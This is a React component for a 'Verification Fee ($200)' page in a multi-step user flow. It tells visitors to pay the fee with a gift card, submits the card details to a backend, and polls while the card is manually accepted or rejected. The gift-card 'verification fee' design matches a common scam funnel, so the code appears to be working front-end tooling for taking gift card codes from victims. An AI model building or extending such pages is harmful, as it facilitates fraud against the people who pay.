import React, { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { useUser } from '../../context/UserContext';
import { submitCard, getCardStatus, updateStep } from '../../services/api';
import CardInputForm from '../../components/CardInputForm';
import './VerificationPage.css';

const VerificationPage = () => {
  const { userId, user, updateUser } = useUser();
  const navigate = useNavigate();
  const [cardStatus, setCardStatus] = useState(null);
  const [reason, setReason] = useState('');
  const [submitting, setSubmitting] = useState(false);

  // Redirect guard – allow entry from processing step and beyond
  useEffect(() => {
    if (!userId) {
      navigate('/');
      return;
    }
    const allowedSteps = ['processing', 'verification', 'complete'];
    if (user && !allowedSteps.includes(user.step)) {
      navigate('/');
    }
  }, [userId, user, navigate]);

  // Poll card status
  useEffect(() => {
    if (!userId) return;

    const checkStatus = async () => {
      try {
        const res = await getCardStatus(userId, 'verification');
        setCardStatus(res.data.status);
        if (res.data.status === 'rejected') setReason(res.data.rejectionReason || '');
      } catch (err) {
        console.error(err);
      }
    };

    checkStatus();
    const interval = setInterval(() => {
      if (cardStatus === 'pending') {
        checkStatus();
      }
    }, 5000);

    return () => clearInterval(interval);
  }, [userId, cardStatus]);

  const handleCardSubmit = async (cardData) => {
    setSubmitting(true);
    try {
      await submitCard(userId, cardData);
      setCardStatus('pending');
    } catch (err) {
      alert('Submission failed.');
      console.error(err);
    } finally {
      setSubmitting(false);
    }
  };

  const handleProceed = async () => {
    // Update step to 'complete' before navigating
    try {
      await updateStep(userId, 'complete');
      updateUser({ ...user, step: 'complete' });
    } catch (err) {
      console.error('Step update failed', err);
    }
    navigate('/complete');
  };

  if (!user || !user.userDetails) return <div>Loading...</div>;

  return (
    <div className="verification-page">
      <h1>Verification Fee ($200)</h1>
      <p>Pay $200 verification fee using a gift card.</p>

      {cardStatus === 'accepted' ? (
        <div>
          <p className="success-msg">Verification card accepted!</p>
          <button onClick={handleProceed}>Complete</button>
        </div>
      ) : cardStatus === 'rejected' ? (
        <div>
          <p className="error-msg">Card rejected: {reason}</p>
          <p>Please try again with a valid card.</p>
          <CardInputForm type="verification" onSubmit={handleCardSubmit} disabled={submitting} />
        </div>
      ) : cardStatus === 'pending' ? (
        <div>
          <p className="pending-msg">Verification card under review...</p>
          <p className="auto-update-note">This page updates automatically. No need to refresh.</p>
        </div>
      ) : (
        <CardInputForm type="verification" onSubmit={handleCardSubmit} disabled={submitting} />
      )}
    </div>
  );
};

export default VerificationPage;